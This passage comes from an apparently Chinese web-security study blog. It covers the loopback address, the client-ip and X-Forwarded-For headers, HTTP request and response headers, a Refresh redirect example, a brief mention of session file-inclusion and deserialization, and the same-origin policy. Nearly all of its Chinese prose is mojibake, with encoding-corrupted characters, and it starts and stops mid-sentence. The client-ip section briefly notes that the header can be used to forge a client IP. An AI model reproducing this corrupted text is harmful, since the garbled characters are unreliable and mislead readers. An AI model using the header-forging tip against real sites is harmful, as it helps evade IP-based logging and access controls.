address</code>ï¼‰ï¼Œä¸å±äºä»»ä½•ä¸€ä¸ªæœ‰ç±»åˆ«åœ°å€ç±»ã€‚å®ƒä»£è¡¨è®¾å¤‡çš„æœ¬åœ°è™šæ‹Ÿæ¥å£ï¼Œæ‰€ä»¥é»˜è®¤è¢«çœ‹ä½œæ˜¯æ°¸è¿œä¸ä¼šå®•æ‰çš„æ¥å£ã€‚</p><p>ä¸»è¦ä½œç”¨æœ‰ä¸¤ä¸ªï¼šä¸€æ˜¯æµ‹è¯•æœ¬æœºçš„ç½‘ç»œé…ç½®ï¼Œèƒ½PINGé€š<code>127.0.0.1</code>è¯´æ˜æœ¬æœºçš„ç½‘å¡å’Œ<code>IP</code>åè®®å®‰è£…éƒ½æ²¡æœ‰é—®é¢˜ï¼›å¦ä¸€ä¸ªä½œç”¨æ˜¯æŸäº›<code>SERVER/CLIENT</code>çš„åº”ç”¨ç¨‹åºåœ¨è¿è¡Œæ—¶éœ€è°ƒç”¨æœåŠ¡å™¨ä¸Šçš„èµ„æºï¼Œä¸€èˆ¬è¦æŒ‡å®š<code>SERVER</code>çš„<code>IP</code>åœ°å€ï¼Œä½†å½“è¯¥ç¨‹åºè¦åœ¨åŒä¸€å°æœºå™¨ä¸Šè¿è¡Œè€Œæ²¡æœ‰åˆ«çš„<code>SERVER</code>æ—¶å°±å¯ä»¥æŠŠSERVERçš„èµ„æºè£…åœ¨æœ¬æœºï¼Œ<code>SERVER</code>çš„<code>IP</code>åœ°å€è®¾ä¸º<code>127.0.0.1</code>åŒæ ·ä¹Ÿå¯ä»¥è¿è¡Œã€‚</p><p><strong>æœ¬åœ°å›ç¯åœ°å€æŒ‡çš„æ˜¯ä»¥<code>127</code>å¼€å¤´çš„åœ°å€ï¼ˆ<code>127.0.0.1 - 127.255.255.254</code>ï¼‰ï¼Œé€šå¸¸ç”¨<code>127.0.0.1</code>æ¥è¡¨ç¤º</strong></p><p>ä½†æ˜¯ï¼Œä½¿ç”¨<code>127.0.0.1/8</code>å†…çš„ä¸åŒåœ°å€ï¼Œå°±å¯ä»¥åœ¨æœ¬æœºä¸Šè®¾ç½®ä¾¦å¬ç›¸åŒç«¯å£çš„å¤šä¸ªæœåŠ¡å™¨</p></blockquote><h1 id="5-client-ipå’ŒX-Forwarded-For"><a href="#5-client-ipå’ŒX-Forwarded-For" class="headerlink" title="5.client-ipå’ŒX-Forwarded-For"></a>5.<code>client-ip</code>å’Œ<code>X-Forwarded-For</code></h1><blockquote><p>1ï¼‰<code>client-ip</code>ï¼šå®¢æˆ·ç«¯ipï¼Œç›¸è¾ƒäºX-Forwarded-Forï¼Œå®ƒåªæœ‰ä¸€ä¸ªipä¹Ÿå°±æ˜¯çœŸå®ipï¼Œå½“ä¸èƒ½ä¼ªé€ XFFå¤´çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç”¨client-ipä»£æ›¿ï¼Œç›´æ¥æŒ‡æ˜ä¼ªé€ ip</p><p>2ï¼‰<code>X-Forwarded-For</code>:ç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP  ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹ã€‚xffæ˜¯httpçš„æ‹“å±•å¤´éƒ¨ï¼Œä½œç”¨æ˜¯ä½¿WebæœåŠ¡å™¨è·å–è®¿é—®ç”¨æˆ·çš„IPçœŸå®åœ°å€ï¼ˆå¯ä¼ªé€ ï¼‰ã€‚ç”±äºå¾ˆå¤šç”¨æˆ·é€šè¿‡ä»£ç†æœåŠ¡å™¨è¿›è¡Œè®¿é—®ï¼ŒæœåŠ¡å™¨åªèƒ½è·å–ä»£ç†æœåŠ¡å™¨çš„IPåœ°å€ï¼Œè€Œxffçš„ä½œç”¨åœ¨äºè®°å½•ç”¨æˆ·çš„çœŸå®IPï¼Œä»¥åŠä»£ç†æœåŠ¡å™¨çš„IPã€‚æ ¼å¼ä¸ºï¼šX-Forwarded-For: æœ¬æœºIP, ä»£ç†1IP, ä»£ç†2IP, ä»£ç†2IP</p></blockquote><h1 id="6-è¯·æ±‚å¤´ã€å“åº”å¤´å…¨éƒ¨å†…å®¹"><a href="#6-è¯·æ±‚å¤´ã€å“åº”å¤´å…¨éƒ¨å†…å®¹" class="headerlink" title="6.è¯·æ±‚å¤´ã€å“åº”å¤´å…¨éƒ¨å†…å®¹"></a>6.è¯·æ±‚å¤´ã€å“åº”å¤´å…¨éƒ¨å†…å®¹</h1><h2 id="HTTPè¯·æ±‚å¤´"><a href="#HTTPè¯·æ±‚å¤´" class="headerlink" title="HTTPè¯·æ±‚å¤´"></a>HTTPè¯·æ±‚å¤´</h2><blockquote><p>Acceptï¼šæµè§ˆå™¨å¯æ¥å—çš„MIMEç±»å‹ã€‚</p><p>Accept-Charsetï¼šæµè§ˆå™¨å¯æ¥å—çš„å­—ç¬¦é›†ã€‚</p><p>Accept-Encodingï¼šæµè§ˆå™¨èƒ½å¤Ÿè¿›è¡Œè§£ç çš„æ•°æ®ç¼–ç æ–¹å¼ï¼Œæ¯”å¦‚gzipã€‚Servletèƒ½å¤Ÿå‘æ”¯æŒgzipçš„æµè§ˆå™¨è¿”å›ç»gzipç¼–ç çš„HTMLé¡µé¢ã€‚è®¸å¤šæƒ…å½¢ä¸‹è¿™å¯ä»¥å‡å°‘5åˆ°10å€çš„ä¸‹è½½æ—¶é—´ã€‚</p><p>Accept-Languageï¼šæµè§ˆå™¨æ‰€å¸Œæœ›çš„è¯­è¨€ç§ç±»ï¼Œå½“æœåŠ¡å™¨èƒ½å¤Ÿæä¾›ä¸€ç§ä»¥ä¸Šçš„è¯­è¨€ç‰ˆæœ¬æ—¶è¦ç”¨åˆ°ã€‚</p><p><code>Authorization</code>ï¼šæˆæƒä¿¡æ¯ï¼Œé€šå¸¸å‡ºç°åœ¨å¯¹æœåŠ¡å™¨å‘é€çš„WWW-Authenticateå¤´çš„åº”ç­”ä¸­ã€‚</p><p>Connectionï¼šè¡¨ç¤ºæ˜¯å¦éœ€è¦æŒä¹…è¿æ¥ã€‚å¦‚æœServletçœ‹åˆ°è¿™é‡Œçš„å€¼ä¸ºâ€œKeep-Aliveâ€ï¼Œæˆ–è€…çœ‹åˆ°è¯·æ±‚ä½¿ç”¨çš„æ˜¯HTTP 1.1ï¼ˆHTTP 1.1é»˜è®¤è¿›è¡ŒæŒä¹…è¿æ¥ï¼‰ï¼Œå®ƒå°±å¯ä»¥åˆ©ç”¨æŒä¹…è¿æ¥çš„ä¼˜ç‚¹ï¼Œå½“é¡µé¢åŒ…å«å¤šä¸ªå…ƒç´ æ—¶ï¼ˆä¾‹å¦‚Appletï¼Œå›¾ç‰‡ï¼‰ï¼Œæ˜¾è‘—åœ°å‡å°‘ä¸‹è½½æ‰€éœ€è¦çš„æ—¶é—´ã€‚è¦å®ç°è¿™ä¸€ç‚¹ï¼ŒServletéœ€è¦åœ¨åº”ç­”ä¸­å‘é€ä¸€ä¸ªContent-Lengthå¤´ï¼Œæœ€ç®€å•çš„å®ç°æ–¹æ³•æ˜¯ï¼šå…ˆæŠŠå†…å®¹å†™å…¥ByteArrayOutputStreamï¼Œç„¶ååœ¨æ­£å¼å†™å‡ºå†…å®¹ä¹‹å‰è®¡ç®—å®ƒçš„å¤§å°ã€‚</p><p>Content-Lengthï¼šè¡¨ç¤ºè¯·æ±‚æ¶ˆæ¯æ­£æ–‡çš„é•¿åº¦ã€‚</p><p><code>Cookie</code>ï¼šè¿™æ˜¯æœ€é‡è¦çš„è¯·æ±‚å¤´ä¿¡æ¯ä¹‹ä¸€</p><p>Fromï¼šè¯·æ±‚å‘é€è€…çš„emailåœ°å€ï¼Œç”±ä¸€äº›ç‰¹æ®Šçš„Webå®¢æˆ·ç¨‹åºä½¿ç”¨ï¼Œæµè§ˆå™¨ä¸ä¼šç”¨åˆ°å®ƒã€‚</p><p><code>Host</code>ï¼šåˆå§‹URLä¸­çš„ä¸»æœºå’Œç«¯å£ã€‚</p><p>If-Modified-Sinceï¼šåªæœ‰å½“æ‰€è¯·æ±‚çš„å†…å®¹åœ¨æŒ‡å®šçš„æ—¥æœŸä¹‹ååˆç»è¿‡ä¿®æ”¹æ‰è¿”å›å®ƒï¼Œå¦åˆ™è¿”å›304â€œNot Modifiedâ€åº”ç­”ã€‚</p><p>Pragmaï¼šæŒ‡å®šâ€œno-cacheâ€å€¼è¡¨ç¤ºæœåŠ¡å™¨å¿…é¡»è¿”å›ä¸€ä¸ªåˆ·æ–°åçš„æ–‡æ¡£ï¼Œå³ä½¿å®ƒæ˜¯ä»£ç†æœåŠ¡å™¨è€Œä¸”å·²ç»æœ‰äº†é¡µé¢çš„æœ¬åœ°æ‹·è´ã€‚</p><p><code>Referer</code>ï¼šåŒ…å«ä¸€ä¸ªURLï¼Œç”¨æˆ·ä»è¯¥URLä»£è¡¨çš„é¡µé¢å‡ºå‘è®¿é—®å½“å‰è¯·æ±‚çš„é¡µé¢ã€‚</p><p><code>User-Agent</code>ï¼šæµè§ˆå™¨ç±»å‹ï¼Œå¦‚æœServletè¿”å›çš„å†…å®¹ä¸æµè§ˆå™¨ç±»å‹æœ‰å…³åˆ™è¯¥å€¼éå¸¸æœ‰ç”¨ã€‚</p><p>UA-Pixelsï¼ŒUA-Colorï¼ŒUA-OSï¼ŒUA-CPUï¼šç”±æŸäº›ç‰ˆæœ¬çš„IEæµè§ˆå™¨æ‰€å‘é€çš„éæ ‡å‡†çš„è¯·æ±‚å¤´ï¼Œè¡¨ç¤ºå±å¹•å¤§å°ã€é¢œè‰²æ·±åº¦ã€æ“ä½œç³»ç»Ÿå’ŒCPUç±»å‹ã€‚</p></blockquote><h2 id="HTTPåº”ç­”å¤´"><a href="#HTTPåº”ç­”å¤´" class="headerlink" title="HTTPåº”ç­”å¤´"></a>HTTPåº”ç­”å¤´</h2><blockquote><p>WebæœåŠ¡å™¨çš„HTTPåº”ç­”ä¸€èˆ¬ç”±ä»¥ä¸‹å‡ é¡¹æ„æˆï¼šä¸€ä¸ªçŠ¶æ€è¡Œï¼Œä¸€ä¸ªæˆ–å¤šä¸ªåº”ç­”å¤´ï¼Œä¸€ä¸ªç©ºè¡Œï¼Œå†…å®¹æ–‡æ¡£ã€‚è®¾ç½®HTTPåº”ç­”å¤´å¾€å¾€å’Œè®¾ç½®çŠ¶æ€è¡Œä¸­çš„çŠ¶æ€ä»£ç ç»“åˆèµ·æ¥ã€‚ä¾‹å¦‚ï¼Œæœ‰å¥½å‡ ä¸ªè¡¨ç¤ºâ€œæ–‡æ¡£ä½ç½®å·²ç»æ”¹å˜â€çš„çŠ¶æ€ä»£ç éƒ½ä¼´éšç€ä¸€ä¸ªLocationå¤´ï¼Œè€Œ401ï¼ˆUnauthorizedï¼‰çŠ¶æ€ä»£ç åˆ™å¿…é¡»ä¼´éšä¸€ä¸ªWWW-Authenticateå¤´ã€‚<br>ç„¶è€Œï¼Œå³ä½¿åœ¨æ²¡æœ‰è®¾ç½®ç‰¹æ®Šå«ä¹‰çš„çŠ¶æ€ä»£ç æ—¶ï¼ŒæŒ‡å®šåº”ç­”å¤´ä¹Ÿæ˜¯å¾ˆæœ‰ç”¨çš„ã€‚åº”ç­”å¤´å¯ä»¥ç”¨æ¥å®Œæˆï¼šè®¾ç½®Cookieï¼ŒæŒ‡å®šä¿®æ”¹æ—¥æœŸï¼ŒæŒ‡ç¤ºæµè§ˆå™¨æŒ‰ç…§æŒ‡å®šçš„é—´éš”åˆ·æ–°é¡µé¢ï¼Œå£°æ˜æ–‡æ¡£çš„é•¿åº¦ä»¥ä¾¿åˆ©ç”¨æŒä¹…HTTPè¿æ¥ï¼Œç­‰ç­‰è®¸å¤šå…¶ä»–ä»»åŠ¡ã€‚<br>è®¾ç½®åº”ç­”å¤´æœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯<code>HttpServletResponse</code>çš„<code>setHeader</code>ï¼Œè¯¥æ–¹æ³•æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«è¡¨ç¤ºåº”ç­”å¤´çš„åå­—å’Œå€¼ã€‚å’Œè®¾ç½®çŠ¶æ€ä»£ç ç›¸ä¼¼ï¼Œè®¾ç½®åº”ç­”å¤´åº”è¯¥åœ¨å‘é€ä»»ä½•æ–‡æ¡£å†…å®¹ä¹‹å‰è¿›è¡Œã€‚</p></blockquote><blockquote><p><code>setContentType</code>ï¼šè®¾ç½®Content-Typeå¤´ã€‚å¤§å¤šæ•°<code>Servlet</code>éƒ½è¦ç”¨åˆ°è¿™ä¸ªæ–¹æ³•ã€‚</p><p>setContentLengthï¼šè®¾ç½®Content-Lengthå¤´ã€‚å¯¹äºæ”¯æŒæŒä¹…HTTPè¿æ¥çš„æµè§ˆå™¨æ¥è¯´ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚</p><p><code>addCookie</code>ï¼šè®¾ç½®ä¸€ä¸ªCookieï¼ˆ<code>Servlet</code> <code>API</code>ä¸­æ²¡æœ‰<code>setCookie</code>æ–¹æ³•ï¼Œå› ä¸ºåº”ç­”å¾€å¾€åŒ…å«å¤šä¸ªSet-Cookieå¤´ï¼‰ã€‚<br>å¦å¤–ï¼Œå¦‚ä¸ŠèŠ‚ä»‹ç»ï¼Œ<code>sendRedirect</code>æ–¹æ³•è®¾ç½®çŠ¶æ€ä»£ç 302æ—¶ä¹Ÿä¼šè®¾ç½®Locationå¤´ã€‚</p><p>HTTPåº”ç­”å¤´ è¯´æ˜<br>Allow æœåŠ¡å™¨æ”¯æŒå“ªäº›è¯·æ±‚æ–¹æ³•ï¼ˆå¦‚GETã€POSTç­‰ï¼‰ã€‚</p><p>Content-Encoding æ–‡æ¡£çš„ç¼–ç ï¼ˆEncodeï¼‰æ–¹æ³•ã€‚åªæœ‰åœ¨è§£ç ä¹‹åæ‰å¯ä»¥å¾—åˆ°Content-Typeå¤´æŒ‡å®šçš„å†…å®¹ç±»å‹ã€‚åˆ©ç”¨<code>gzip</code>å‹ç¼©æ–‡æ¡£èƒ½å¤Ÿæ˜¾è‘—åœ°å‡å°‘HTMLæ–‡æ¡£çš„ä¸‹è½½æ—¶é—´ã€‚Javaçš„<code>GZIPOutputStream</code>å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è¿›è¡Œ<code>gzip</code>å‹ç¼©ï¼Œä½†åªæœ‰Unixä¸Šçš„Netscapeå’ŒWindowsä¸Šçš„IE 4ã€IE 5æ‰æ”¯æŒå®ƒã€‚å› æ­¤ï¼Œ<code>Servlet</code>åº”è¯¥é€šè¿‡æŸ¥çœ‹Accept-Encodingå¤´ï¼ˆå³<code>request.getHeader</code>(â€œAccept-Encodingâ€)ï¼‰æ£€æŸ¥æµè§ˆå™¨æ˜¯å¦æ”¯æŒgzipï¼Œä¸ºæ”¯æŒ<code>gzip</code>çš„æµè§ˆå™¨è¿”å›ç»<code>gzip</code>å‹ç¼©çš„HTMLé¡µé¢ï¼Œä¸ºå…¶ä»–æµè§ˆå™¨è¿”å›æ™®é€šé¡µé¢ã€‚</p><p>Content-Length è¡¨ç¤ºå†…å®¹é•¿åº¦ã€‚åªæœ‰å½“æµè§ˆå™¨ä½¿ç”¨æŒä¹…HTTPè¿æ¥æ—¶æ‰éœ€è¦è¿™ä¸ªæ•°æ®ã€‚å¦‚æœä½ æƒ³è¦åˆ©ç”¨æŒä¹…è¿æ¥çš„ä¼˜åŠ¿ï¼Œå¯ä»¥æŠŠè¾“å‡ºæ–‡æ¡£å†™å…¥ByteArrayOutputStramï¼Œå®ŒæˆåæŸ¥çœ‹å…¶å¤§å°ï¼Œç„¶åæŠŠè¯¥å€¼æ”¾å…¥Content-Lengthå¤´ï¼Œæœ€åé€šè¿‡byteArrayStream.writeTo(response.getOutputStream()å‘é€å†…å®¹ã€‚</p><p>Content-Type è¡¨ç¤ºåé¢çš„æ–‡æ¡£å±äºä»€ä¹ˆMIMEç±»å‹ã€‚Servleté»˜è®¤ä¸ºtext&#x2F;plainï¼Œä½†é€šå¸¸éœ€è¦æ˜¾å¼åœ°æŒ‡å®šä¸º<br>text&#x2F;htmlã€‚ç”±äºç»å¸¸è¦è®¾ç½®Content-Typeï¼Œå› æ­¤HttpServletResponseæä¾›äº†ä¸€ä¸ªä¸“ç”¨çš„æ–¹æ³•setContentTypeã€‚</p><p>Date å½“å‰çš„GMTæ—¶é—´ã€‚ä½ å¯ä»¥ç”¨setDateHeaderæ¥è®¾ç½®è¿™ä¸ªå¤´ä»¥é¿å…è½¬æ¢æ—¶é—´æ ¼å¼çš„éº»çƒ¦ã€‚</p><p>Expires åº”è¯¥åœ¨ä»€ä¹ˆæ—¶å€™è®¤ä¸ºæ–‡æ¡£å·²ç»è¿‡æœŸï¼Œä»è€Œä¸å†ç¼“å­˜å®ƒï¼Ÿ<br>Last-Modified æ–‡æ¡£çš„æœ€åæ”¹åŠ¨æ—¶é—´ã€‚å®¢æˆ·å¯ä»¥é€šè¿‡If-Modified-Sinceè¯·æ±‚å¤´æä¾›ä¸€ä¸ªæ—¥æœŸï¼Œè¯¥è¯·æ±‚å°†è¢«è§†ä¸ºä¸€ä¸ªæ¡ä»¶GETï¼Œåªæœ‰æ”¹åŠ¨æ—¶é—´è¿ŸäºæŒ‡å®šæ—¶é—´çš„æ–‡æ¡£æ‰ä¼šè¿”å›ï¼Œå¦åˆ™è¿”å›ä¸€ä¸ª304ï¼ˆNot Modifiedï¼‰çŠ¶æ€ã€‚Last-Modifiedä¹Ÿå¯ç”¨setDateHeaderæ–¹æ³•æ¥è®¾ç½®ã€‚</p><p>Location è¡¨ç¤ºå®¢æˆ·åº”å½“åˆ°å“ªé‡Œå»æå–æ–‡æ¡£ã€‚Locationé€šå¸¸ä¸æ˜¯ç›´æ¥è®¾ç½®çš„ï¼Œè€Œæ˜¯é€šè¿‡HttpServletResponseçš„sendRedirectæ–¹æ³•ï¼Œè¯¥æ–¹æ³•åŒæ—¶è®¾ç½®çŠ¶æ€ä»£ç ä¸º302ã€‚</p><p>Refresh è¡¨ç¤ºæµè§ˆå™¨åº”è¯¥åœ¨å¤šå°‘æ—¶é—´ä¹‹ååˆ·æ–°æ–‡æ¡£ï¼Œä»¥ç§’è®¡ã€‚é™¤äº†åˆ·æ–°å½“å‰æ–‡æ¡£ä¹‹å¤–ï¼Œä½ è¿˜å¯ä»¥é€šè¿‡</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">setHeader</span><span class="params">(<span class="string">&quot;Refresh&quot;</span>, <span class="string">&quot;5; URL=http://host/path&quot;</span>)</span></span></span><br></pre></td></tr></table></figure><p>è®©æµè§ˆå™¨è¯»å–æŒ‡å®šçš„é¡µé¢ã€‚æ³¨æ„è¿™ç§åŠŸèƒ½é€šå¸¸æ˜¯é€šè¿‡è®¾ç½®HTMLé¡µé¢HEADåŒºçš„</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;META <span class="attribute">HTTP-EQUIV</span>=<span class="string">&quot;Refresh&quot;</span> <span class="attribute">CONTENT</span>=<span class="string">&quot;5;URL=http://host/path&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><code>[æ³¨ï¼Œç¬”è€…å¼€å§‹æŠŠè¿™æ®µä»£ç å¤åˆ¶åˆ°è¯¥åšå®¢æ—¶ï¼Œå‘ç°ä¸€ç›´åœ¨å‘host/pathï¼Œè·³è½¬ï¼Œæœ€åæŸ¥çœ‹ç½‘ç»œï¼Œæ‰å‘ç°è¿™é‡Œè¿™æ®µä»£ç å‘æŒ¥äº†ä½œç”¨ï¼Œå¹¶æ²¡æœ‰å½“ä½œç®€å•çš„æ–‡æœ¬]</code></p><p>å®ç°ï¼Œè¿™æ˜¯å› ä¸ºï¼Œè‡ªåŠ¨åˆ·æ–°æˆ–é‡å®šå‘å¯¹äºé‚£äº›ä¸èƒ½ä½¿ç”¨<code>CGI</code>æˆ–<code>Servlet</code>çš„HTMLç¼–å†™è€…ååˆ†é‡è¦ã€‚ä½†æ˜¯ï¼Œå¯¹äº<code>Servlet</code>æ¥è¯´ï¼Œç›´æ¥è®¾ç½®Refreshå¤´æ›´åŠ æ–¹ä¾¿ã€‚æ³¨æ„Refreshçš„æ„ä¹‰æ˜¯â€œNç§’ä¹‹ååˆ·æ–°æœ¬é¡µé¢æˆ–è®¿é—®æŒ‡å®šé¡µé¢â€ï¼Œè€Œä¸æ˜¯â€œæ¯éš”Nç§’åˆ·æ–°æœ¬é¡µé¢æˆ–è®¿é—®æŒ‡å®šé¡µé¢â€ã€‚å› æ­¤ï¼Œè¿ç»­åˆ·æ–°è¦æ±‚æ¯æ¬¡éƒ½å‘é€ä¸€ä¸ªRefreshå¤´ï¼Œè€Œå‘é€204çŠ¶æ€ä»£ç åˆ™å¯ä»¥é˜»æ­¢æµè§ˆå™¨ç»§ç»­åˆ·æ–°ï¼Œä¸ç®¡æ˜¯ä½¿ç”¨Refreshå¤´è¿˜æ˜¯&lt;META HTTP-EQUIV&#x3D;â€Refreshâ€ â€¦&gt;ã€‚æ³¨æ„Refreshå¤´ä¸å±äºHTTP 1.1æ­£å¼è§„èŒƒçš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ˜¯ä¸€ä¸ªæ‰©å±•ï¼Œä½†Netscapeå’ŒIEéƒ½æ”¯æŒå®ƒã€‚</p><p>Server æœåŠ¡å™¨åå­—ã€‚Servletä¸€èˆ¬ä¸è®¾ç½®è¿™ä¸ªå€¼ï¼Œè€Œæ˜¯ç”±WebæœåŠ¡å™¨è‡ªå·±è®¾ç½®ã€‚</p><p><code>Set-Cookie</code> è®¾ç½®å’Œé¡µé¢å…³è”çš„Cookieã€‚Servletä¸åº”ä½¿ç”¨response.setHeader(â€œSet-Cookieâ€, â€¦)ï¼Œè€Œæ˜¯åº”ä½¿ç”¨HttpServletResponseæä¾›çš„ä¸“ç”¨æ–¹æ³•addCookieã€‚å‚è§ä¸‹æ–‡æœ‰å…³Cookieè®¾ç½®çš„è®¨è®ºã€‚</p><p>WWW-Authenticate å®¢æˆ·åº”è¯¥åœ¨Authorizationå¤´ä¸­æä¾›ä»€ä¹ˆç±»å‹çš„æˆæƒä¿¡æ¯ï¼Ÿåœ¨åŒ…å«401ï¼ˆUnauthorizedï¼‰çŠ¶æ€è¡Œçš„åº”ç­”ä¸­è¿™ä¸ªå¤´æ˜¯å¿…éœ€çš„ã€‚ä¾‹å¦‚ï¼Œ<code>response.setHeader</code>(â€œWWW-Authenticateâ€, â€œBASIC realm&#x3D;&quot;executives&quot;â€œ)ã€‚æ³¨æ„<code>Servlet</code>ä¸€èˆ¬ä¸è¿›è¡Œè¿™æ–¹é¢çš„å¤„ç†ï¼Œè€Œæ˜¯è®©WebæœåŠ¡å™¨çš„ä¸“é—¨æœºåˆ¶æ¥æ§åˆ¶å—å¯†ç ä¿æŠ¤é¡µé¢çš„è®¿é—®ï¼ˆä¾‹å¦‚<code>.htaccess</code>ï¼‰ã€‚</p></blockquote><h1 id="7-sessionåˆ©ç”¨çš„å°æ€è·¯"><a href="#7-sessionåˆ©ç”¨çš„å°æ€è·¯" class="headerlink" title="7.sessionåˆ©ç”¨çš„å°æ€è·¯"></a>7.sessionåˆ©ç”¨çš„å°æ€è·¯</h1><p><strong>å¸¸è§çš„åŸºæœ¬å°±ä¸¤ç§ï¼Œ<code>session</code>æ–‡ä»¶åŒ…å«å’Œ<code>session</code>ååºåˆ—åŒ–</strong></p><p><code>åŸæ–‡é“¾æ¥</code>ï¼š<a href="https://xz.aliyun.com/t/10662">https://xz.aliyun.com/t/10662</a></p><h1 id="8-åŒæºç­–ç•¥"><a href="#8-åŒæºç­–ç•¥" class="headerlink" title="8.åŒæºç­–ç•¥"></a>8.åŒæºç­–ç•¥</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä½œè€…ï¼šlaixiangran</span><br><span class="line">é“¾æ¥ï¼šhttps:<span class="regexp">//</span>juejin.cn<span class="regexp">/post/</span><span class="number">6844903681683357710</span></span><br><span class="line">æ¥æºï¼šç¨€åœŸæ˜é‡‘</span><br><span class="line">è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</span><br></pre></td></tr></table></figure><h2 id="å«ä¹‰"><a href="#å«ä¹‰" class="headerlink" title="å«ä¹‰"></a>å«ä¹‰</h2><p>1995å¹´ï¼ŒåŒæºæ”¿ç­–ç”± Netscape å…¬å¸å¼•å…¥æµè§ˆå™¨ã€‚ç›®å‰ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½å®è¡Œè¿™ä¸ªæ”¿ç­–ã€‚</p><p>æœ€åˆï¼Œå®ƒçš„å«ä¹‰æ˜¯æŒ‡ï¼ŒAç½‘é¡µè®¾ç½®çš„ Cookieï¼ŒBç½‘é¡µä¸èƒ½æ‰“å¼€ï¼Œé™¤éè¿™ä¸¤ä¸ªç½‘é¡µâ€åŒæºâ€ã€‚æ‰€è°“â€åŒæºâ€æŒ‡çš„æ˜¯â€ä¸‰ä¸ªç›¸åŒâ€ã€‚</p><blockquote><ul><li>åè®®ç›¸åŒ</li><li>åŸŸåç›¸åŒ</li><li>ç«¯å£ç›¸åŒ</li></ul></blockquote><p>ä¸¾ä¾‹æ¥è¯´ï¼Œ<code>http://www.example.com/dir/page.html</code>è¿™ä¸ªç½‘å€ï¼Œåè®®æ˜¯<code>http://</code>ï¼ŒåŸŸåæ˜¯<code>www.example.com</code>ï¼Œç«¯å£æ˜¯<code>80</code>ï¼ˆé»˜è®¤ç«¯å£å¯ä»¥çœç•¥ï¼‰ã€‚</p><p>å®ƒçš„åŒæºæƒ…å†µå¦‚ä¸‹</p><blockquote><ul><li><code>http://www.example.com/dir2/other.html</code>ï¼šåŒæº</li><li><code>http://example.com/dir/other.html</code>ï¼šä¸åŒæºï¼ˆåŸŸåä¸åŒï¼‰</li><li><code>http://v2.www.example.com/dir/other.html</code>ï¼šä¸åŒæºï¼ˆåŸŸåä¸åŒï¼‰</li><li><code>http://www.example.com:81/dir/other.html</code>ï¼šä¸åŒæºï¼ˆç«¯å£ä¸åŒï¼‰</li></ul></blockquote><h2 id="é™åˆ¶èŒƒå›´"><a href="#é™åˆ¶èŒƒå›´" class="headerlink" title="é™åˆ¶èŒƒå›´"></a>é™åˆ¶èŒƒå›´</h2><p>éšç€äº’è”ç½‘çš„å‘å±•ï¼Œâ€åŒæºæ”¿ç­–â€è¶Šæ¥è¶Šä¸¥æ ¼ã€‚ç›®å‰ï¼Œå¦‚æœéåŒæºï¼Œå…±æœ‰ä¸‰ç§è¡Œä¸ºå—åˆ°é™åˆ¶ã€‚</p><blockquote><p>ï¼ˆ1ï¼‰ Cookieã€LocalStorage å’Œ IndexDB æ— æ³•è¯»å–ã€‚</p><p>ï¼ˆ2ï¼‰ DOM æ— æ³•è·å¾—ã€‚</p><p>ï¼ˆ3ï¼‰ AJAX è¯·æ±‚ä¸èƒ½å‘é€ã€‚</p></blockquote><p>è™½ç„¶è¿™äº›é™åˆ¶æ˜¯å¿…è¦çš„ï¼Œä½†æ˜¯æœ‰æ—¶å¾ˆä¸æ–¹ä¾¿ï¼Œåˆç†çš„ç”¨é€”ä¹Ÿå—åˆ°å½±å“ã€‚ä¸‹é¢ï¼Œæˆ‘å°†è¯¦ç»†ä»‹ç»ï¼Œå¦‚ä½•è§„é¿ä¸Šé¢ä¸‰ç§é™åˆ¶ã€‚</p><h2 id="ä¸ºä»€ä¹ˆè¦æœ‰è·¨åŸŸé™åˆ¶"><a href="#ä¸ºä»€ä¹ˆè¦æœ‰è·¨åŸŸé™åˆ¶" class="headerlink" title="ä¸ºä»€ä¹ˆè¦æœ‰è·¨åŸŸé™åˆ¶"></a>ä¸ºä»€ä¹ˆè¦æœ‰è·¨åŸŸé™åˆ¶</h2><p>å› ä¸ºå­˜åœ¨æµè§ˆå™¨åŒæºç­–ç•¥ï¼Œæ‰€ä»¥æ‰ä¼šæœ‰è·¨åŸŸé—®é¢˜ã€‚é‚£ä¹ˆæµè§ˆå™¨æ˜¯å‡ºäºä½•ç§åŸå› ä¼šæœ‰è·¨åŸŸçš„é™åˆ¶å‘¢ã€‚å…¶å®ä¸éš¾æƒ³åˆ°ï¼Œè·¨åŸŸé™åˆ¶ä¸»è¦çš„ç›®çš„å°±æ˜¯ä¸ºäº†ç”¨æˆ·çš„ä¸Šç½‘å®‰å…¨ã€‚</p><p>å¦‚æœæµè§ˆå™¨æ²¡æœ‰åŒæºç­–ç•¥ï¼Œä¼šå­˜åœ¨ä»€ä¹ˆæ ·çš„å®‰å…¨é—®é¢˜å‘¢ã€‚ä¸‹é¢ä» DOM åŒæºç­–ç•¥å’Œ XMLHttpRequest åŒæºç­–ç•¥æ¥ä¸¾ä¾‹è¯´æ˜ï¼š</p><p><strong>å¦‚æœæ²¡æœ‰ DOM åŒæºç­–ç•¥ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸åŒåŸŸçš„ iframe 